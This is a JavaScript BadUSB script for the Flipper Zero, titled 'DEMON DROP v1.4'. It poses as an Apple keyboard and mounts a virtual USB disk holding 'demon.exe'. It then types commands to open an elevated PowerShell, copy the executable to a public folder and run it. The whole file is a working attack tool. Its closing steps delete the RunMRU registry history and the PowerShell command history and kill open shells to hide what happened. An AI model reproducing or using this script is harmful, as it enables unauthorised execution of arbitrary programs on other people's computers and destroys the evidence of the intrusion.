// *****************************************************************
// DEMON DROP v1.4
// DROP a demon to disk and execute
// Flipper Zero Momentum Firmware Dev D81E72D0 (04.2024)+ required
// A lot of ideas and code from the Momentum Discord was used here
// Author: github.com/syntaxHax
// *****************************************************************

let badusb = require("badusb");
let usbdisk = require("usbdisk");
let storage = require("storage");

/// *****************************************************************
// KEYBOARD LAYOUT LANGUAGE
// *****************************************************************
let layout = "en-US";
// let layout = "ba-BA";
// let layout = "cz_CS";
// let layout = "da-DA";
// let layout = "de-CH";
// let layout = "de-DE";
// let layout = "dvorak";
// let layout = "en-UK";
// let layout = "es-ES";
// let layout = "fr-BE";
// let layout = "fr-CA";
// let layout = "fr-CH";
// let layout = "fr-FR-mac";
// let layout = "fr-FR";
// let layout = "hr-HR";
// let layout = "hu-HU";
// let layout = "it-IT-mac";
// let layout = "it-IT";
// let layout = "nb-NO";
// let layout = "nl-NL";
// let layout = "pt-BR";
// let layout = "pt-PT";
// let layout = "si-SI";
// let layout = "sk-SK";
// let layout = "sv-SE";
// let layout = "tr-TR";

// *****************************************************************
// SETUP
// *****************************************************************
let localTempFolder = "C:\\Users\\Public\\Documents\\"; // local target folder
let payloadName = "demon.exe"; // payload filename stored in "flipperZero > SD Card/apps/Scripts/payloads/"
let payloadSrcName = __dirpath + "/payloads/" + payloadName;
let payloadDstName = "/mnt/" + payloadName;
let exfilCapacityMb = 4; // adjust if payload is > 4MB
let image = __dirpath + "demonDrop.img"; // name of the usb img

// *****************************************************************
// USB IMG
// *****************************************************************
if (storage.exists(image)) {storage.remove(image);}

usbdisk.createImage(image, exfilCapacityMb * 1024 * 1024);

storage.virtualInit(image);
storage.virtualMount();
storage.copy(payloadSrcName, payloadDstName);
storage.virtualQuit();

// *****************************************************************
// EMULATED KEYBOARD
// *****************************************************************
badusb.setup({
  vid: 0x1234,
  pid: 0x5678,
  mfr_name: "Apple",
  prod_name: "Keyboard",
  layout_path: "/ext/badusb/assets/layouts/" + layout + ".kl"
});

while (!badusb.isConnected()) {delay(1000);}

// *****************************************************************
// DEMON DROP
// *****************************************************************
print("DEMON DROP v1.4");

// launch admin powershell via task manager (WIN10 & WIN11)
// if not admin this should still execute as user
badusb.press("CTRL", "SHIFT", "ESC");
delay(500);
badusb.press("TAB");
delay(500);
badusb.press("SPACE");
delay(500);
badusb.press("ALT");
delay(500);
badusb.press("F");
delay(500);
badusb.press("N");
delay(500);
badusb.print("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
delay(500);
badusb.press("TAB");
delay(500);
badusb.press("SPACE");
delay(2000);
badusb.press("ENTER");
delay(2000);
badusb.print("cd " + localTempFolder);
delay(500);
badusb.press("ENTER");
print("> launch ps");
delay(1000);

// close task manager window
badusb.press("CTRL", "SHIFT", "ESC");
delay(1000);
badusb.press("ALT", "F4");
delay(1000);

// assign drive letter of USB img
badusb.print("do { Start-Sleep 3; $DiskN = Get-Disk | Select-Object -Property Number,FriendlyName | Where-Object -FilterScript { ($_.FriendlyName) -eq \"Flipper Mass Storage\"} | Select-Object -ExpandProperty Number; } while ($DiskN -lt 0); $DiskL = (Get-Partition -DiskN ${DiskN} | Select-Object -ExpandProperty DriveLetter) -join ''");
badusb.press("ENTER");
print("> mount usbdisk");
delay(1000);

// transfer payload
badusb.print("$Payload = ${DiskL} + ':\\" + payloadName + "'; ");
badusb.print("Copy-Item -Path $Payload;");
badusb.press("ENTER");
delay(1000);

// execute payload
badusb.print(localTempFolder + payloadName);
badusb.press("ENTER");
print("> execute payload");
delay(1000);

// eject usbdisk
badusb.print("Start-Sleep 7; $eject = New-Object -comObject Shell.Application; $eject.Namespace(17).ParseName($DiskL+':').InvokeVerb('Eject'); ");
print("> eject usbdisk");
delay(1000);

// wipe logs
badusb.print("reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f; Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue; clear; ");
print("> wipe ps logs");
delay(1000);

// close any open powershell, cmd, windows terminals and detach keyboard
// badusb.print("Start-Sleep 5; exit");
badusb.print("Start-Sleep 5; Get-Process cmd, powershell, wt -ErrorAction SilentlyContinue | Stop-Process; exit");
badusb.press("ENTER");
badusb.press("ENTER");
badusb.press("ENTER");
badusb.quit();
print("> wait for detach");
delay(1000);

// attach usbdisk, wait for script to finish, detach usbdisk
usbdisk.start(image);
while (!usbdisk.wasEjected()) {delay(1000);}
usbdisk.stop();
